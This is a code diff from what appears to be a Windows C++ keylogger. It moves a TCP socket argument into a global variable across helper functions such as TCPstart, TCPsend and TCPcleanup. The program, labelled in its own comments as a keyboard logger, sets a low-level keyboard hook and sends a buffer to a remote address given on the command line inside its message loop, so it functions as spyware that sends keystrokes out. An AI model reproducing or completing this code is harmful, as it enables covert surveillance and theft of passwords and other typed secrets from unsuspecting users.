@@ -42,11 +42,11 @@ KBDLLHOOKSTRUCT kbdStruct;
 SOCKET ConnectSocket = INVALID_SOCKET;
 char* sendbuf;
 LRESULT CALLBACK KeyboardProc(UINT, WPARAM, LPARAM);
-int TCPstart(char*, SOCKET);
-int TCPsend(char*, SOCKET);
-int TCPclosesend(SOCKET);
-int TCPreceive(SOCKET);
-int TCPcleanup(SOCKET);
+int TCPstart(char*);
+int TCPsend(char*);
+int TCPclosesend();
+int TCPreceive();
+int TCPcleanup();
 
 
 int __cdecl main(int argc, char **argv) {
@@ -61,12 +61,12 @@ int __cdecl main(int argc, char **argv) {
 		return 1;
 	}
 	//Establish connection, return when there is error
-	if (TCPstart(argv[1], ConnectSocket)) {
+	if (TCPstart(argv[1])) {
 		return 1;
 	}
 	cout << "TCP connection established" << endl;
 	sendbuf = "test";
-	TCPsend(sendbuf, ConnectSocket);
+	TCPsend(sendbuf);
 	//send(ConnectSocket, sendbuf, strlen(sendbuf), 0);
 
 	//Keyboard logger setup
@@ -78,11 +78,11 @@ int __cdecl main(int argc, char **argv) {
 	while (GetMessage(&msg, NULL, 0, 0)){
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
-		TCPsend(sendbuf, ConnectSocket);
+		TCPsend(sendbuf);
 
 	}
 	//cleanup
-	TCPcleanup(ConnectSocket);
+	TCPcleanup();
     UnhookWindowsHookEx(hKeyHook);
 	return 0;
 }
@@ -151,7 +151,7 @@ LRESULT CALLBACK KeyboardProc(UINT uMsg, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(hKeyHook, uMsg, wParam, lParam);
 }
 
-int TCPstart(char* addr, SOCKET ConnectSocket) {
+int TCPstart(char* addr) {
 	WSADATA wsaData;
 	int iResult;
 	//init winsock
@@ -206,7 +206,7 @@ int TCPstart(char* addr, SOCKET ConnectSocket) {
 	return iResult;
 }
 
-int TCPsend(char* data, SOCKET ConnectSocket) {
+int TCPsend(char* data) {
 	int iResult;
 	//send an initial buffer
 	//iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
@@ -222,7 +222,7 @@ int TCPsend(char* data, SOCKET ConnectSocket) {
 	return iResult;
 }
 
-int TCPsendclose(SOCKET ConnectSocket) {
+int TCPsendclose() {
 	//shutdown the connection for sending since all data is sent
 	//the client can still use the connectsocket for receiving data
 	int iResult = shutdown(ConnectSocket, SD_SEND);
@@ -235,7 +235,7 @@ int TCPsendclose(SOCKET ConnectSocket) {
 	return 0;
 }
 
-int TCPreceive(SOCKET ConnectSocket) {
+int TCPreceive() {
 	//sending and receiving data
 	int recvbuflen = DEFAULT_BUFLEN;
 //	char sendbuf[20];
@@ -262,7 +262,7 @@ int TCPreceive(SOCKET ConnectSocket) {
 	return iResult;
 }
 
-int TCPcleanup(SOCKET ConnectSocket) {
+int TCPcleanup() {
 	//cleanup
 	closesocket(ConnectSocket);
 	WSACleanup();
